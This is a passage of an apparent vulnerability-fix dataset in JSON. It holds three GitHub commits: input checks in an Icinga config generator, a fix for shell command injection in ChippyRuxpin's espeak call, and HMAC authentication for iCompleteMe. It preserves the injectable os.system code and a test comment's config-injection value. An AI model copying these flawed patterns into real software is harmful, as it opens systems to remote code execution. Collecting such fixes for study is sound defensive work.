prevent","diff":"diff --git a\/src\/main\/python\/monitoring_config_generator\/MonitoringConfigGenerator.py b\/src\/main\/python\/monitoring_config_generator\/MonitoringConfigGenerator.py\nindex 8fab35c..6ab871a 100644\n--- a\/src\/main\/python\/monitoring_config_generator\/MonitoringConfigGenerator.py\n+++ b\/src\/main\/python\/monitoring_config_generator\/MonitoringConfigGenerator.py\n@@ -119,8 +119,14 @@ def write_section(self, section_name, section_data):\n         sorted_keys = section_data.keys()\n         sorted_keys.sort()\n         for key in sorted_keys:\n-            value = section_data[key]\n-            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))\n+            value = self.value_to_icinga(section_data[key])\n+            icinga_line = \"%s%-45s%s\" % (self.indent, key, value)\n+\n+            if \"\\n\" in icinga_line or \"}\" in icinga_line:\n+                msg = \"Found forbidden newline or '}' character in section %r.\"\n+                raise Exception(msg % section_name)\n+\n+            self.icinga_lines.append(icinga_line)\n         self.write_line(\"}\")\n \n     @staticmethod\ndiff --git a\/src\/unittest\/python\/YamlToIcinga_tests.py b\/src\/unittest\/python\/YamlToIcinga_tests.py\nindex 8b7f121..dbf436a 100644\n--- a\/src\/unittest\/python\/YamlToIcinga_tests.py\n+++ b\/src\/unittest\/python\/YamlToIcinga_tests.py\n@@ -1,5 +1,6 @@\n import os\n import unittest\n+from mock import Mock\n \n os.environ['MONITORING_CONFIG_GENERATOR_CONFIG'] = \"testdata\/testconfig.yaml\"\n from monitoring_config_generator.MonitoringConfigGenerator import YamlToIcinga\n@@ -24,3 +25,28 @@ def test_list_to_cvs(self):\n         self.assertEquals(\",,,\", YamlToIcinga.value_to_icinga([None, None, None, None]))\n         self.assertEquals(\",23,42,\", YamlToIcinga.value_to_icinga([None, \"23\", 42, None]))\n \n+    def _get_config_mock(self, host=None, services=None):\n+        config = Mock()\n+        config.host = host or {}\n+        config.services = services or {}\n+        return config\n+\n+    def test_write_section_forbidden_characters(self):\n+        # Malicious hosts may try to insert new sections, e.g. by setting a\n+        # value to  \"42\\n}\\n define command {\\n ......\" which would lead to\n+        # arbitrary code execution. Therefore, certain characters must be\n+        # forbidden.\n+        header = Mock()\n+        header.serialize.return_value = \"the header\"\n+\n+        for forbidden in '\\n', '}':\n+            # Forbidden character in 'host' section.\n+            config = self._get_config_mock(host={'key': 'xx%syy' % forbidden})\n+            self.assertRaises(Exception, YamlToIcinga, config, header)\n+            config = self._get_config_mock(host={'xx%syy' % forbidden: \"value\"})\n+            self.assertRaises(Exception, YamlToIcinga, config, header)\n+\n+            config = self._get_config_mock(services={'foo': 'xx%syy' % forbidden})\n+            self.assertRaises(Exception, YamlToIcinga, config, header)\n+            config = self._get_config_mock(services={'xx%syy' % forbidden: \"value\"})\n+            self.assertRaises(Exception, YamlToIcinga, config, header)\n","message":"","files":{"\/src\/main\/python\/monitoring_config_generator\/MonitoringConfigGenerator.py":{"changes":[{"diff":"\n         sorted_keys = section_data.keys()\n         sorted_keys.sort()\n         for key in sorted_keys:\n-            value = section_data[key]\n-            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))\n+            value = self.value_to_icinga(section_data[key])\n+            icinga_line = \"%s%-45s%s\" % (self.indent, key, value)\n+\n+            if \"\\n\" in icinga_line or \"}\" in icinga_line:\n+                msg = \"Found forbidden newline or '}' character in section %r.\"\n+                raise Exception(msg % section_name)\n+\n+            self.icinga_lines.append(icinga_line)\n         self.write_line(\"}\")\n \n     @staticmethod","add":8,"remove":2,"filename":"\/src\/main\/python\/monitoring_config_generator\/MonitoringConfigGenerator.py","badparts":["            value = section_data[key]","            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))"],"goodparts":["            value = self.value_to_icinga(section_data[key])","            icinga_line = \"%s%-45s%s\" % (self.indent, key, value)","            if \"\\n\" in icinga_line or \"}\" in icinga_line:","                msg = \"Found forbidden newline or '}' character in section %r.\"","                raise Exception(msg % section_name)","            self.icinga_lines.append(icinga_line)"]},{"diff":"\n         sorted_keys = section_data.keys()\n         sorted_keys.sort()\n         for key in sorted_keys:\n-            value = section_data[key]\n-            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))\n+            value = self.value_to_icinga(section_data[key])\n+            icinga_line = \"%s%-45s%s\" % (self.indent, key, value)\n+\n+            if \"\\n\" in icinga_line or \"}\" in icinga_line:\n+                msg = \"Found forbidden newline or '}' character in section %r.\"\n+                raise Exception(msg % section_name)\n+\n+            self.icinga_lines.append(icinga_line)\n         self.write_line(\"}\")\n \n     @staticmethod","add":8,"remove":2,"filename":"\/src\/main\/python\/monitoring_config_generator\/MonitoringConfigGenerator.py","badparts":["            value = section_data[key]","            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))"],"goodparts":["            value = self.value_to_icinga(section_data[key])","            icinga_line = \"%s%-45s%s\" % (self.indent, key, value)","            if \"\\n\" in icinga_line or \"}\" in icinga_line:","                msg = \"Found forbidden newline or '}' character in section %r.\"","                raise Exception(msg % section_name)","            self.icinga_lines.append(icinga_line)"]}],"source":"\n\"\"\"monconfgenerator Creates an Icinga monitoring configuration. It does it by querying an URL from which it receives a specially formatted yaml file. This file is transformed into a valid Icinga configuration file. If no URL is given it reads it's default configuration from file system. The configuration file is: \/etc\/monitoring_config_generator\/config.yaml' Usage: monconfgenerator[--debug][--targetdir=<directory>][--skip-checks][URL] monconfgenerator -h Options: -h Show this message. --debug Print additional information. --targetdir=DIR The generated Icinga monitoring configuration is written into this directory. If no target directory is given its value is read from \/etc\/monitoring_config_generator\/config.yaml --skip-checks Do not run checks on the yaml file received from the URL. \"\"\" from datetime import datetime import logging import os import sys from docopt import docopt from monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, \\ ConfigurationContainsUndefinedVariables, NoSuchHostname, HostUnreachableException from monitoring_config_generator import set_log_level_to_debug from monitoring_config_generator.yaml_tools.readers import Header, read_config from monitoring_config_generator.yaml_tools.config import YamlConfig from monitoring_config_generator.settings import CONFIG EXIT_CODE_CONFIG_WRITTEN=0 EXIT_CODE_ERROR=1 EXIT_CODE_NOT_WRITTEN=2 LOG=logging.getLogger(\"monconfgenerator\") class MonitoringConfigGenerator(object): def __init__(self, url, debug_enabled=False, target_dir=None, skip_checks=False): self.skip_checks=skip_checks self.target_dir=target_dir if target_dir else CONFIG['TARGET_DIR'] self.source=url if debug_enabled: set_log_level_to_debug() if not self.target_dir or not os.path.isdir(self.target_dir): raise MonitoringConfigGeneratorException(\"%s is not a directory\" % self.target_dir) LOG.debug(\"Using %s as target dir\" % self.target_dir) LOG.debug(\"Using URL: %s\" % self.source) LOG.debug(\"MonitoringConfigGenerator start: reading from %s, writing to %s\" % (self.source, self.target_dir)) def _is_newer(self, header_source, hostname): if not hostname: raise NoSuchHostname('hostname not found') output_path=self.output_path(self.create_filename(hostname)) old_header=Header.parse(output_path) return header_source.is_newer_than(old_header) def output_path(self, file_name): return os.path.join(self.target_dir, file_name) def write_output(self, file_name, yaml_icinga): lines=yaml_icinga.icinga_lines output_writer=OutputWriter(self.output_path(file_name)) output_writer.write_lines(lines) @staticmethod def create_filename(hostname): name='%s.cfg' % hostname if name !=os.path.basename(name): msg=\"Directory traversal attempt detected for host name %r\" raise Exception(msg % hostname) return name def generate(self): file_name=None raw_yaml_config, header_source=read_config(self.source) if raw_yaml_config is None: raise SystemExit(\"Raw yaml config from source '%s' is 'None'.\" % self.source) yaml_config=YamlConfig(raw_yaml_config, skip_checks=self.skip_checks) if yaml_config.host and self._is_newer(header_source, yaml_config.host_name): file_name=self.create_filename(yaml_config.host_name) yaml_icinga=YamlToIcinga(yaml_config, header_source) self.write_output(file_name, yaml_icinga) if file_name: LOG.info(\"Icinga config file '%s' created.\" % file_name) return file_name class YamlToIcinga(object): def __init__(self, yaml_config, header): self.icinga_lines=[] self.indent=CONFIG['INDENT'] self.icinga_lines.extend(header.serialize()) self.write_section('host', yaml_config.host) for service in yaml_config.services: self.write_section('service', service) def write_line(self, line): self.icinga_lines.append(line) def write_section(self, section_name, section_data): self.write_line(\"\") self.write_line(\"define %s{\" % section_name) sorted_keys=section_data.keys() sorted_keys.sort() for key in sorted_keys: value=section_data[key] self.icinga_lines.append((\"%s%-45s%s\" %(self.indent, key, self.value_to_icinga(value)))) self.write_line(\"}\") @staticmethod def value_to_icinga(value): \"\"\"Convert a scalar or list to Icinga value format. Lists are concatenated by, and empty(None) values produce an empty string\"\"\" if isinstance(value, list): return \",\".join([str(x) if(x is not None) else \"\" for x in value]) else: return str(value) class OutputWriter(object): def __init__(self, output_file): self.output_file=output_file def write_lines(self, lines): with open(self.output_file, 'w') as f: for line in lines: f.write(line +\"\\n\") LOG.debug(\"Created %s\" % self.output_file) def generate_config(): arg=docopt(__doc__, version='0.1.0') start_time=datetime.now() try: file_name=MonitoringConfigGenerator(arg['URL'], arg['--debug'], arg['--targetdir'], arg['--skip-checks']).generate() exit_code=EXIT_CODE_CONFIG_WRITTEN if file_name else EXIT_CODE_NOT_WRITTEN except HostUnreachableException: LOG.warn(\"Target url{0} unreachable. Could not get yaml config!\".format(arg['URL'])) exit_code=EXIT_CODE_NOT_WRITTEN except ConfigurationContainsUndefinedVariables: LOG.error(\"Configuration contained undefined variables!\") exit_code=EXIT_CODE_ERROR except SystemExit as e: exit_code=e.code except BaseException as e: LOG.error(e) exit_code=EXIT_CODE_ERROR finally: stop_time=datetime.now() LOG.info(\"finished in %s\" %(stop_time -start_time)) sys.exit(exit_code) if __name__=='__main__': generate_config() ","sourceWithComments":"\"\"\"monconfgenerator\n\nCreates an Icinga monitoring configuration. It does it by querying an URL from\nwhich it receives a specially formatted yaml file. This file is transformed into\na valid Icinga configuration file.\nIf no URL is given it reads it's default configuration from file system. The\nconfiguration file is: \/etc\/monitoring_config_generator\/config.yaml'\n\nUsage:\n  monconfgenerator [--debug] [--targetdir=<directory>] [--skip-checks] [URL]\n  monconfgenerator -h\n\nOptions:\n  -h                Show this message.\n  --debug           Print additional information.\n  --targetdir=DIR   The generated Icinga monitoring configuration is written\n                    into this directory. If no target directory is given its\n                    value is read from \/etc\/monitoring_config_generator\/config.yaml\n  --skip-checks     Do not run checks on the yaml file received from the URL.\n\n\"\"\"\nfrom datetime import datetime\nimport logging\nimport os\nimport sys\n\nfrom docopt import docopt\n\nfrom monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, \\\n    ConfigurationContainsUndefinedVariables, NoSuchHostname, HostUnreachableException\nfrom monitoring_config_generator import set_log_level_to_debug\nfrom monitoring_config_generator.yaml_tools.readers import Header, read_config\nfrom monitoring_config_generator.yaml_tools.config import YamlConfig\nfrom monitoring_config_generator.settings import CONFIG\n\n\nEXIT_CODE_CONFIG_WRITTEN = 0\nEXIT_CODE_ERROR = 1\nEXIT_CODE_NOT_WRITTEN = 2\n\nLOG = logging.getLogger(\"monconfgenerator\")\n\n\nclass MonitoringConfigGenerator(object):\n    def __init__(self, url, debug_enabled=False, target_dir=None, skip_checks=False):\n        self.skip_checks = skip_checks\n        self.target_dir = target_dir if target_dir else CONFIG['TARGET_DIR']\n        self.source = url\n\n        if debug_enabled:\n            set_log_level_to_debug()\n\n        if not self.target_dir or not os.path.isdir(self.target_dir):\n            raise MonitoringConfigGeneratorException(\"%s is not a directory\" % self.target_dir)\n\n        LOG.debug(\"Using %s as target dir\" % self.target_dir)\n        LOG.debug(\"Using URL: %s\" % self.source)\n        LOG.debug(\"MonitoringConfigGenerator start: reading from %s, writing to %s\" %\n                  (self.source, self.target_dir))\n\n    def _is_newer(self, header_source, hostname):\n        if not hostname:\n            raise NoSuchHostname('hostname not found')\n        output_path = self.output_path(self.create_filename(hostname))\n        old_header = Header.parse(output_path)\n        return header_source.is_newer_than(old_header)\n\n    def output_path(self, file_name):\n        return os.path.join(self.target_dir, file_name)\n\n    def write_output(self, file_name, yaml_icinga):\n        lines = yaml_icinga.icinga_lines\n        output_writer = OutputWriter(self.output_path(file_name))\n        output_writer.write_lines(lines)\n\n    @staticmethod\n    def create_filename(hostname):\n        name = '%s.cfg' % hostname\n        if name != os.path.basename(name):\n            msg = \"Directory traversal attempt detected for host name %r\"\n            raise Exception(msg % hostname)\n        return name\n\n    def generate(self):\n        file_name = None\n        raw_yaml_config, header_source = read_config(self.source)\n\n        if raw_yaml_config is None:\n            raise SystemExit(\"Raw yaml config from source '%s' is 'None'.\" % self.source)\n\n        yaml_config = YamlConfig(raw_yaml_config,\n                                 skip_checks=self.skip_checks)\n\n        if yaml_config.host and self._is_newer(header_source, yaml_config.host_name):\n            file_name = self.create_filename(yaml_config.host_name)\n            yaml_icinga = YamlToIcinga(yaml_config, header_source)\n            self.write_output(file_name, yaml_icinga)\n\n        if file_name:\n            LOG.info(\"Icinga config file '%s' created.\" % file_name)\n\n        return file_name\n\nclass YamlToIcinga(object):\n    def __init__(self, yaml_config, header):\n        self.icinga_lines = []\n        self.indent = CONFIG['INDENT']\n        self.icinga_lines.extend(header.serialize())\n        self.write_section('host', yaml_config.host)\n        for service in yaml_config.services:\n            self.write_section('service', service)\n\n    def write_line(self, line):\n        self.icinga_lines.append(line)\n\n    def write_section(self, section_name, section_data):\n        self.write_line(\"\")\n        self.write_line(\"define %s {\" % section_name)\n        sorted_keys = section_data.keys()\n        sorted_keys.sort()\n        for key in sorted_keys:\n            value = section_data[key]\n            self.icinga_lines.append((\"%s%-45s%s\" % (self.indent, key, self.value_to_icinga(value))))\n        self.write_line(\"}\")\n\n    @staticmethod\n    def value_to_icinga(value):\n        \"\"\"Convert a scalar or list to Icinga value format. Lists are concatenated by ,\n        and empty (None) values produce an empty string\"\"\"\n        if isinstance(value, list):\n            # explicitly set None values to empty string\n            return \",\".join([str(x) if (x is not None) else \"\" for x in value])\n        else:\n            return str(value)\n\n\nclass OutputWriter(object):\n    def __init__(self, output_file):\n        self.output_file = output_file\n\n    def write_lines(self, lines):\n        with open(self.output_file, 'w') as f:\n            for line in lines:\n                f.write(line + \"\\n\")\n        LOG.debug(\"Created %s\" % self.output_file)\n\n\ndef generate_config():\n    arg = docopt(__doc__, version='0.1.0')\n    start_time = datetime.now()\n    try:\n        file_name = MonitoringConfigGenerator(arg['URL'],\n                                              arg['--debug'],\n                                              arg['--targetdir'],\n                                              arg['--skip-checks']).generate()\n        exit_code = EXIT_CODE_CONFIG_WRITTEN if file_name else EXIT_CODE_NOT_WRITTEN\n    except HostUnreachableException:\n        LOG.warn(\"Target url {0} unreachable. Could not get yaml config!\".format(arg['URL']))\n        exit_code = EXIT_CODE_NOT_WRITTEN\n    except ConfigurationContainsUndefinedVariables:\n        LOG.error(\"Configuration contained undefined variables!\")\n        exit_code = EXIT_CODE_ERROR\n    except SystemExit as e:\n        exit_code = e.code\n    except BaseException as e:\n        LOG.error(e)\n        exit_code = EXIT_CODE_ERROR\n    finally:\n        stop_time = datetime.now()\n        LOG.info(\"finished in %s\" % (stop_time - start_time))\n    sys.exit(exit_code)\n\n\nif __name__ == '__main__':\n    generate_config()\n"}},"msg":"Prevent remote code execution\n\nMalicious yaml config could add new sections that would normally be forbidden."}},"https:\/\/github.com\/ntc-chip-revived\/ChippyRuxpin":{"0cd7d78e4d806852fd75fee03c24cce322f76014":{"url":"https:\/\/api.github.com\/repos\/ntc-chip-revived\/ChippyRuxpin\/commits\/0cd7d78e4d806852fd75fee03c24cce322f76014","html_url":"https:\/\/github.com\/ntc-chip-revived\/ChippyRuxpin\/commit\/0cd7d78e4d806852fd75fee03c24cce322f76014","message":"prevent remote code execution by passing argumrnts to subprocess.call instead of os.system","sha":"0cd7d78e4d806852fd75fee03c24cce322f76014","keyword":"remote code execution prevent","diff":"diff --git a\/chippyRuxpin.py b\/chippyRuxpin.py\nold mode 100644\nnew mode 100755\nindex 92e9bd6..e03cae8\n--- a\/chippyRuxpin.py\n+++ b\/chippyRuxpin.py\n@@ -95,7 +95,7 @@ def talk(myText):\n     \r\n     os.system( \"espeak \\\",...\\\" 2>\/dev\/null\" ) # Sometimes the beginning of audio can get cut off. Insert silence.\r\n     time.sleep( 0.5 )\r\n-    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r\n+    subprocess.call([\"espeak\", \"-w\", \"speech.wav\", myText, \"-s\", \"130\"])\r\n     audio.play(\"speech.wav\")\r\n     return myText\r\n \r\n","files":{"\/chippyRuxpin.py":{"changes":[{"diff":"\n     \r\n     os.system( \"espeak \\\",...\\\" 2>\/dev\/null\" ) # Sometimes the beginning of audio can get cut off. Insert silence.\r\n     time.sleep( 0.5 )\r\n-    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r\n+    subprocess.call([\"espeak\", \"-w\", \"speech.wav\", myText, \"-s\", \"130\"])\r\n     audio.play(\"speech.wav\")\r\n     return myText\r\n \r\n","add":1,"remove":1,"filename":"\/chippyRuxpin.py","badparts":["    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r"],"goodparts":["    subprocess.call([\"espeak\", \"-w\", \"speech.wav\", myText, \"-s\", \"130\"])\r"]},{"diff":"\n     \r\n     os.system( \"espeak \\\",...\\\" 2>\/dev\/null\" ) # Sometimes the beginning of audio can get cut off. Insert silence.\r\n     time.sleep( 0.5 )\r\n-    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r\n+    subprocess.call([\"espeak\", \"-w\", \"speech.wav\", myText, \"-s\", \"130\"])\r\n     audio.play(\"speech.wav\")\r\n     return myText\r\n \r\n","add":1,"remove":1,"filename":"\/chippyRuxpin.py","badparts":["    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r"],"goodparts":["    subprocess.call([\"espeak\", \"-w\", \"speech.wav\", myText, \"-s\", \"130\"])\r"]}],"source":"\n \r \r \r consumerKey='INSERT YOUR CONSUMER KEY HERE FROM TWITTER'\r consumerSecret='INSERT YOUR CONSUMER SECRET HERE FROM TWITTER'\r accessTokenKey='INSERT YOUR ACCESS TOKEN KEY HERE FROM TWITTER'\r accessTokenSecret='INSERT YOUR ACCESS TOKEN SECRET HERE FROM TWITTER'\r \r import sys\r import time\r import subprocess\r import os\r from random import randint\r from threading import Thread\r from chippyRuxpin_audioPlayer import AudioPlayer\r from chippyRuxpin_gpio import GPIO\r from chippyRuxpin_twitter import ChippyTwitter\r from chippyRuxpin_webFramework import WebFramework\r \r fullMsg=\"\"\r \r MOUTH_OPEN=408 MOUTH_CLOSE=412 EYES_OPEN=410 EYES_CLOSE=414 \r io=GPIO() io.setup( MOUTH_OPEN)\r io.setup( EYES_OPEN)\r io.setup( MOUTH_CLOSE)\r io.setup( EYES_CLOSE)\r \r audio=None\r isRunning=True\r \r def updateMouth():\r lastMouthEvent=0\r lastMouthEventTime=0\r \r while( audio==None):\r time.sleep( 0.1)\r \r while isRunning:\r if( audio.mouthValue !=lastMouthEvent):\r lastMouthEvent=audio.mouthValue\r lastMouthEventTime=time.time()\r \r if( audio.mouthValue==1):\r io.set( MOUTH_OPEN, 1)\r io.set( MOUTH_CLOSE, 0)\r else:\r io.set( MOUTH_OPEN, 0)\r io.set( MOUTH_CLOSE, 1)\r else:\r if( time.time() -lastMouthEventTime > 0.4):\r io.set( MOUTH_OPEN, 0)\r io.set( MOUTH_CLOSE, 0)\r \r def updateEyes():\r while isRunning:\r io.set( EYES_CLOSE, 1)\r io.set( EYES_OPEN, 0)\r time.sleep(0.4)\r io.set( EYES_CLOSE, 0)\r io.set( EYES_OPEN, 1)\r time.sleep(0.4)\r io.set( EYES_CLOSE, 1)\r io.set( EYES_OPEN, 0)\r time.sleep(0.4)\r io.set( EYES_CLOSE, 0)\r io.set( EYES_OPEN, 0)\r time.sleep( randint( 0,7))\r \r def talk(myText):\r if( myText.find( \"twitter\") >=0):\r myText +=\"0\"\r myText=myText[7:-1]\r try:\r \t myText=twitter.getTweet( myText)\r \texcept:\r \t print( \"!!!ERROR: INVALID TWITTER CREDENTIALS. Please read README.md for instructions.\")\r return\r \r os.system( \"espeak \\\",...\\\" 2>\/dev\/null\") time.sleep( 0.5)\r os.system( \"espeak -w speech.wav \\\"\" +myText +\"\\\" -s 130\")\r audio.play(\"speech.wav\")\r return myText\r \r mouthThread=Thread(target=updateMouth)\r mouthThread.start()\r eyesThread=Thread(target=updateEyes)\r eyesThread.start() \r audio=AudioPlayer()\r \r if( consumerKey.find( 'TWITTER') >=0):\r print( \"WARNING: INVALID TWITTER CREDENTIALS. Please read README.md for instructions.\") \r else:\r twitter=ChippyTwitter(consumerKey,consumerSecret,accessTokenKey,accessTokenSecret)\r \r web=WebFramework(talk)\r isRunning=False\r io.cleanup()\r sys.exit(1)\r ","sourceWithComments":"#!\/usr\/bin\/python\r\n# Chippy Ruxpin by Next Thing Co\r\n# Powered by C.H.I.P., the world's first $9 computer!\r\n\r\n# apt-get install python-setuptools python-dev build-essential espeak alsa-utils\r\n# apt-get install python-alsaaudio python-numpy python-twitter python-bottle mplayer\r\n\r\n# IMPORTANT NOTE ABOUT TWITTER STUFF!\r\n# In order to retrieve tweets, you need to authorize this code to use your twitter account.\r\n# This involves obtaining some special tokens that are specific to you.\r\n# Please visit Twitter's website to obtain this information and put the values in the variables below.\r\n# For more information, visit this URL:\r\n# https:\/\/dev.twitter.com\/oauth\/overview\/application-owner-access-tokens\r\n\r\nconsumerKey='INSERT YOUR CONSUMER KEY HERE FROM TWITTER'\r\nconsumerSecret='INSERT YOUR CONSUMER SECRET HERE FROM TWITTER'\r\naccessTokenKey='INSERT YOUR ACCESS TOKEN KEY HERE FROM TWITTER'\r\naccessTokenSecret='INSERT YOUR ACCESS TOKEN SECRET HERE FROM TWITTER'\r\n\r\nimport sys\r\nimport time\r\nimport subprocess\r\nimport os\r\nfrom random import randint\r\nfrom threading import Thread\r\nfrom chippyRuxpin_audioPlayer import AudioPlayer\r\nfrom chippyRuxpin_gpio import GPIO\r\nfrom chippyRuxpin_twitter import ChippyTwitter\r\nfrom chippyRuxpin_webFramework import WebFramework\r\n\r\nfullMsg = \"\"\r\n\r\nMOUTH_OPEN = 408 # GPIO pin assigned to open the mouth. XIO-P0\r\nMOUTH_CLOSE = 412 # GPIO pin assigned to close the mouth. XIO-P2\r\nEYES_OPEN = 410 # GPIO pin assigned to open the eyes. XIO-P4\r\nEYES_CLOSE = 414 # GPIO pin assigned to close the eyes. XIO-P6\r\n\r\nio = GPIO() #Establish connection to our GPIO pins.\r\nio.setup( MOUTH_OPEN )\r\nio.setup( EYES_OPEN )\r\nio.setup( MOUTH_CLOSE )\r\nio.setup( EYES_CLOSE )\r\n\r\naudio = None\r\nisRunning = True\r\n\r\ndef updateMouth():\r\n    lastMouthEvent = 0\r\n    lastMouthEventTime = 0\r\n\r\n    while( audio == None ):\r\n        time.sleep( 0.1 )\r\n        \r\n    while isRunning:\r\n        if( audio.mouthValue != lastMouthEvent ):\r\n            lastMouthEvent = audio.mouthValue\r\n            lastMouthEventTime = time.time()\r\n\r\n            if( audio.mouthValue == 1 ):\r\n                io.set( MOUTH_OPEN, 1 )\r\n                io.set( MOUTH_CLOSE, 0 )\r\n            else:\r\n                io.set( MOUTH_OPEN, 0 )\r\n                io.set( MOUTH_CLOSE, 1 )\r\n        else:\r\n            if( time.time() - lastMouthEventTime > 0.4 ):\r\n                io.set( MOUTH_OPEN, 0 )\r\n                io.set( MOUTH_CLOSE, 0 )\r\n\r\n# A routine for blinking the eyes in a semi-random fashion.\r\ndef updateEyes():\r\n    while isRunning:\r\n        io.set( EYES_CLOSE, 1 )\r\n        io.set( EYES_OPEN, 0 )\r\n        time.sleep(0.4)\r\n        io.set( EYES_CLOSE, 0 )\r\n        io.set( EYES_OPEN, 1 )\r\n        time.sleep(0.4)\r\n        io.set( EYES_CLOSE, 1 )\r\n        io.set( EYES_OPEN, 0 )\r\n        time.sleep(0.4)\r\n        io.set( EYES_CLOSE, 0 )\r\n        io.set( EYES_OPEN, 0 )\r\n        time.sleep( randint( 0,7) )\r\n   \r\ndef talk(myText):\r\n    if( myText.find( \"twitter\" ) >= 0 ):\r\n        myText += \"0\"\r\n        myText = myText[7:-1]\r\n        try:\r\n\t    myText = twitter.getTweet( myText )\r\n\texcept:\r\n\t    print( \"!!!ERROR: INVALID TWITTER CREDENTIALS. Please read README.md for instructions.\")\r\n            return\r\n    \r\n    os.system( \"espeak \\\",...\\\" 2>\/dev\/null\" ) # Sometimes the beginning of audio can get cut off. Insert silence.\r\n    time.sleep( 0.5 )\r\n    os.system( \"espeak -w speech.wav \\\"\" + myText + \"\\\" -s 130\" )\r\n    audio.play(\"speech.wav\")\r\n    return myText\r\n\r\nmouthThread = Thread(target=updateMouth)\r\nmouthThread.start()\r\neyesThread = Thread(target=updateEyes)\r\neyesThread.start()     \r\naudio = AudioPlayer()\r\n\r\nif( consumerKey.find( 'TWITTER' ) >= 0 ):\r\n    print( \"WARNING: INVALID TWITTER CREDENTIALS. Please read README.md for instructions.\" )    \r\nelse:\r\n    twitter = ChippyTwitter(consumerKey,consumerSecret,accessTokenKey,accessTokenSecret)\r\n\r\nweb = WebFramework(talk)\r\nisRunning = False\r\nio.cleanup()\r\nsys.exit(1)\r\n"}},"msg":"prevent remote code execution by passing argumrnts to subprocess.call instead of os.system"}},"https:\/\/github.com\/jerrymarino\/iCompleteMe":{"e965e0284789e610c0a50d20a92a82ec5c135064":{"url":"https:\/\/api.github.com\/repos\/jerrymarino\/iCompleteMe\/commits\/e965e0284789e610c0a50d20a92a82ec5c135064","html_url":"https:\/\/github.com\/jerrymarino\/iCompleteMe\/commit\/e965e0284789e610c0a50d20a92a82ec5c135064","message":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.","sha":"e965e0284789e610c0a50d20a92a82ec5c135064","keyword":"remote code execution prevent","diff":"diff --git a\/python\/ycm\/client\/base_request.py b\/python\/ycm\/client\/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a\/python\/ycm\/client\/base_request.py\n+++ b\/python\/ycm\/client\/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests\/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http:\/\/localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER ],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a\/python\/ycm\/server\/hmac_plugin.py 